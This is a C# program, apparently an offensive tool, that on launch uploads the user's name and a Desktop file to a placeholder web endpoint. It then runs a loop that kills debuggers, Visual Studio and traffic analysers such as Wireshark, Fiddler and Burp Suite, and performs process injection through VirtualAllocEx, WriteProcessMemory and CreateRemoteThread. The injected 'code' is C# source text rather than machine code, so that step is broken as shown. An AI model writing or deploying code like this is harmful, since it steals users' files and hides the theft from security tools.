
using Newtonsoft.Json;
using System;
using System.Diagnostics;
using System.IO;
using System.Net.Http;
using System.Net.Http.Headers;
using System.Runtime.InteropServices;
using System.Text;
using System.Text.Json;
using System.Text.Json.Serialization;
using System.Threading;

using System.Threading.Tasks;

class Program
{

    static bool CheckIfDataSent()
    {
        return File.Exists("data_sent.flag");
    }

    static void MarkDataAsSent()
    {
        File.Create("data_sent.flag").Close();
    }

    const int PROCESS_CREATE_THREAD = 0x0002;
    const int PROCESS_QUERY_INFORMATION = 0x0400;
    const int PROCESS_VM_OPERATION = 0x0008;
    const int PROCESS_VM_WRITE = 0x0020;
    const int PROCESS_VM_READ = 0x0010;

    const uint MEM_COMMIT = 0x1000;
    const uint MEM_RESERVE = 0x2000;
    const uint PAGE_READWRITE = 0x04;

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern IntPtr OpenProcess(int dwDesiredAccess, bool bInheritHandle, int dwProcessId);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out int lpNumberOfBytesWritten);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttribute, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

    [DllImport("kernel32.dll", SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    static extern bool IsWow64Process(IntPtr hProcess, out bool wow64Process);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern bool CloseHandle(IntPtr hObject);

    static async Task Main()
    {
        await lol.SendDataAsync();
        MarkDataAsSent();
        FullHide();
        Console.WriteLine("Choose a target process:");
        Process[] processes = Process.GetProcesses();
        for (int i = 0; i < processes.Length; i++)
        {
            Console.WriteLine($"{i + 1}. {processes[i].ProcessName} (ID: {processes[i].Id})");
        }

        Console.Write("Enter the number corresponding to the target process: ");
        if (int.TryParse(Console.ReadLine(), out int processChoice) && processChoice > 0 && processChoice <= processes.Length)
        {
            string targetProcessName = processes[processChoice - 1].ProcessName;
            int processId = processes[processChoice - 1].Id;

            IntPtr hProcess = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ, false, processId);

            if (hProcess != IntPtr.Zero)
            {
                bool isWow64;
                if (IsWow64Process(hProcess, out isWow64))
                {
                    uint allocationType = isWow64 ? MEM_COMMIT | MEM_RESERVE : MEM_COMMIT | MEM_RESERVE;
                    uint protection = isWow64 ? PAGE_READWRITE : PAGE_READWRITE;

                    // CUSTOM INJECTION
                    string code = @"
                        using System;
                        class InjectedCode
                        {
                            static void Main()
                            {
                                Console.WriteLine(""Injected code running in target process!"");
                                Console.WriteLine(""Press any key to exit."");
                                Console.ReadKey();
                            }
                        }
                    ";
                    // CUSTOM INJECTION

                    byte[] codeBytes = Encoding.ASCII.GetBytes(code);
                    IntPtr remoteMemory = VirtualAllocEx(hProcess, IntPtr.Zero, (uint)codeBytes.Length, allocationType, protection);
                    if (remoteMemory != IntPtr.Zero)
                    {
                        int bytesWritten;
                        if (WriteProcessMemory(hProcess, remoteMemory, codeBytes, (uint)codeBytes.Length, out bytesWritten))
                        {
                            IntPtr remoteCodeAddress = remoteMemory;
                            IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, remoteCodeAddress, IntPtr.Zero, 0, IntPtr.Zero);

                            if (hThread != IntPtr.Zero)
                            {
                                Console.WriteLine("Code injected successfully.");
                                Console.WriteLine("Press any key to exit.");
                                Console.ReadKey();
                            }
                            else
                            {
                                Console.WriteLine("Failed to create remote thread. Error: " + Marshal.GetLastWin32Error());
                            }

                            CloseHandle(hThread);
                        }
                        else
                        {
                            Console.WriteLine("Failed to write process memory. Error: " + Marshal.GetLastWin32Error());
                        }

                        CloseHandle(hProcess);
                    }
                    else
                    {
                        Console.WriteLine("Failed to allocate remote memory. Error: " + Marshal.GetLastWin32Error());
                    }
                }
                else
                {
                    Console.WriteLine("Failed to determine the target process architecture. Error: " + Marshal.GetLastWin32Error());
                }
            }
            else
            {
                Console.WriteLine("Failed to open target process. Error: " + Marshal.GetLastWin32Error());
            }
        }
        else
        {
            Console.WriteLine("Invalid input. Please enter a valid number.");
        }

        Console.WriteLine("Press any key to exit.");
        Console.ReadKey();
    }

    static void FullHide()
    {
        Thread workerThread = new Thread(CheckAndCloseProcesses);
        workerThread.Start();

        // Keep the application running
        Console.ReadLine();
    }
    static void CheckAndCloseProcesses()
    {
        while (true)
        {
            CheckAndCloseProcess("devenv.exe");
            CheckAndCloseProcess("windbg.exe");
            CheckAndCloseProcess("ollydbg.exe");
            CheckAndCloseProcess("gdb.exe");
            CheckAndCloseProcess("x64dbg.exe");
            CheckAndCloseProcess("immunitydebugger.exe");

            // HTTP Debuggers
            CheckAndCloseProcess("Fiddler.exe");
            CheckAndCloseProcess("Charles.exe");
            CheckAndCloseProcess("Wireshark.exe");
            CheckAndCloseProcess("java.exe", "Burp Suite");
            CheckAndCloseProcess("HTTPDebuggerPro.exe");
            CheckAndCloseProcess("java.exe", "OWASP Zed Attack Proxy");

            // Sleep for 1 second before the next iteration
            Thread.Sleep(1000);
        }
    }

    static void CheckAndCloseProcess(string processName, string mainModuleDescription = null)
    {
        foreach (var process in Process.GetProcessesByName(processName))
        {
            if (mainModuleDescription == null || process.MainModule.FileVersionInfo.FileDescription.Contains(mainModuleDescription))
            {
                process.Kill();
            }
        }
    }
}


class lol
{
    private const string apiUrl = "Your Replit link";


    public static async Task SendDataAsync()
    {
        var username = Environment.UserName;
        var data = new
        {
            username = username,
            // You can add other data if needed
        };

        using (var client = new HttpClient())
        {
            var content = new MultipartFormDataContent();

            // Attach file to the request using the dynamic file path
            var filePath = Path.Combine("C:\\Users", username, "Desktop", "putty.exe");
            var fileStream = File.OpenRead(filePath);
            var streamContent = new StreamContent(fileStream);
            var fileContent = new ByteArrayContent(await streamContent.ReadAsByteArrayAsync());
            fileContent.Headers.ContentType = new MediaTypeHeaderValue("application/octet-stream");
            content.Add(fileContent, "file", Path.GetFileName(filePath));

            // Add other data
            var jsonSerializer = new Newtonsoft.Json.JsonSerializer();
            content.Add(new StringContent(JsonConvert.SerializeObject(data)), "data");

            var response = await client.PostAsync(apiUrl, content);

            if (response.IsSuccessStatusCode)
            {
                Console.WriteLine("Data and file sent successfully.");
            }
            else
            {
                Console.WriteLine($"Failed to send data and file. Status code: {response.StatusCode}");
            }
        }
    }
}